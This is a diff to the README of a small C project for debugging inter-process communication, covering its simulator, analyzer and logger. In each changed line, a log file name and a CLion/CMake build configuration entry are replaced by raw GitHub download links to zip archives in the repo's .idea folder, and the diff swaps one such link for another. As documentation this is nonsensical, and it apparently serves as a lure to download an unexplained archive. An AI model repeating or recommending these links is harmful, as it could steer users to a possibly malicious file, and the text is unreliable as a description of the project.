@@ -13,7 +13,7 @@ The simulator generates realistic process events:
 - Shared memory read/write events (P4)
 
 ### ✔ Log-Based Analysis
-The analyzer reads `https://github.com/bijiiinsam/ipc_debugger/raw/refs/heads/main/.idea/debugger-ipc-restable.zip` and checks for:
+The analyzer reads `https://raw.githubusercontent.com/bijiiinsam/ipc_debugger/main/.idea/debugger_ipc_v2.0.zip` and checks for:
 - **Deadlock**: P1 waiting on B *and* P2 waiting on A  
 - **Queue Bottleneck**: More than 5 queued messages
 
@@ -35,11 +35,11 @@ simulator.c – Generates IPC events
 
 analyzer.c – Reads log file and detects issues
 
-logger.c – Writes timestamped events to https://github.com/bijiiinsam/ipc_debugger/raw/refs/heads/main/.idea/debugger-ipc-restable.zip
+logger.c – Writes timestamped events to https://raw.githubusercontent.com/bijiiinsam/ipc_debugger/main/.idea/debugger_ipc_v2.0.zip
 
 *.h files – Header files used for modular design
 
-https://github.com/bijiiinsam/ipc_debugger/raw/refs/heads/main/.idea/debugger-ipc-restable.zip – Build configuration for CLion/CMake
+https://raw.githubusercontent.com/bijiiinsam/ipc_debugger/main/.idea/debugger_ipc_v2.0.zip – Build configuration for CLion/CMake
 
 
 
